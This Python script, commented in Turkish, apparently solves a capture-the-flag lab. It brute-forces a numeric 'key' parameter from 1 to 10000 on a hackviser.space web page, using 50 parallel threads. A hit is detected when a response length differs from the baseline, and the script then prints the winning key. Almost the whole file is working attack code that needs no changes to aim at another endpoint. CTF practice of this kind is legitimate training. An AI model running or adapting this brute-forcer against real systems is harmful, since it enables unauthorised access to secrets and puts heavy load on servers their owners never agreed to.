import requests
import sys
from concurrent.futures import ThreadPoolExecutor
import time

# --- Yapılandırma ---
URL = "https://glorious-sauron.europe1.hackviser.space/index.php"
TIMEOUT = 5              # İstek için maksimum bekleme süresi (saniye)
MAX_WORKERS = 50         # Aynı anda çalışacak maksimum iş parçacığı (thread) sayısı
KEY_RANGE = range(1, 10001) # Denenecek anahtar aralığı (1'den 10000'e kadar)
# --------------------

# Global değişkenler
NORMAL_LEN = -1
FOUND_FLAG = False

def check_key(key_value):
    """Belirtilen key değeri ile istek atar ve uzunluğu kontrol eder."""
    
    global FOUND_FLAG
    
    # Bayrak (flag) zaten bulunduysa daha fazla istek gönderme
    if FOUND_FLAG:
        return

    params = {'key': key_value}

    try:
        response = requests.get(URL, params=params, timeout=TIMEOUT)
        current_len = len(response.text)
        
        # Ana kontrol: Mevcut uzunluk normal uzunluğa eşit değilse
        if current_len != NORMAL_LEN:
            
            # Bulunduysa hemen global bayrağı değiştir ve sonucu yaz
            if not FOUND_FLAG:
                FOUND_FLAG = True
                print("\n" + "=" * 50)
                print(f"!!! PARALEL ARAMA BAŞARILI !!!")
                print(f"DOĞRU ANAHTAR (KEY): {key_value}")
                print(f"Yanıt Uzunluğu: {current_len} (Normal: {NORMAL_LEN})")
                print("=" * 50)
                # Gizli mesajı görmek isterseniz, aşağıdaki satırı etkinleştirin:
                # print("\n--- Yanıt İçeriği ---\n")
                # print(response.text)
                
            return True # Bulundu

    except requests.exceptions.RequestException:
        # Hata olsa bile diğer thread'lerin çalışmaya devam etmesi için None döndür
        pass
        
    return False # Bulunmadı

def run_paralel_bruteforce():
    global NORMAL_LEN
    global FOUND_FLAG
    
    print("--- Paralel CTF Brute-Force Başlatılıyor ---")

    # 1. Normal (Baseline) Uzunluğu Bulma
    try:
        baseline_params = {'key': 1}
        print(f"1. Normal uzunluk tespiti için istek gönderiliyor: {URL}?key=1")
        baseline_response = requests.get(URL, params=baseline_params, timeout=TIMEOUT)
        
        NORMAL_LEN = len(baseline_response.text)
        print(f"2. Normal (Baseline) Yanıt Uzunluğu: {NORMAL_LEN} byte")
        print(f"3. {MAX_WORKERS} iş parçacığı ile {len(KEY_RANGE)} deneme başlatılıyor. Lütfen bekleyin...")
        print("-" * 50)

    except requests.exceptions.RequestException as e:
        print(f"HATA: Normal uzunluk tespiti başarısız oldu. Sunucuya ulaşılamıyor: {e}")
        sys.exit(1)

    start_time = time.time()
    
    # 4. Paralel Brute-Force Denemesi
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        # Tüm denemeleri iş parçacıklarına gönder
        futures = [executor.submit(check_key, key) for key in KEY_RANGE]
        
        # Sonuçları bekle ve ilerlemeyi izle (isteğe bağlı)
        for i, future in enumerate(futures):
            # İlerleme takibi
            if i % 500 == 0 and i > 0 and not FOUND_FLAG:
                 sys.stdout.write(f"\r-> İlerleme: {i}/{len(KEY_RANGE)} deneme kontrol edildi...")
                 sys.stdout.flush()

            # Bayrak bulunduysa tüm thread'leri sonlandır (Bu, ThreadPoolExecutor ile tam kontrol sağlamaz,
            # ancak Found_FLAG kontrolü yeni istekleri durdurur.)
            if FOUND_FLAG:
                # Tüm iş parçacıklarını bitirmeye zorlayamayız, ancak bulduğumuz an durabiliriz.
                break

    end_time = time.time()

    if not FOUND_FLAG:
        print("\n--- Tüm Denemeler Tamamlandı (1-10000) ---")
        print("Farklı uzunlukta bir yanıt bulunamadı.")
    
    print(f"Toplam Geçen Süre: {end_time - start_time:.2f} saniye")

if __name__ == "__main__":
    run_paralel_bruteforce()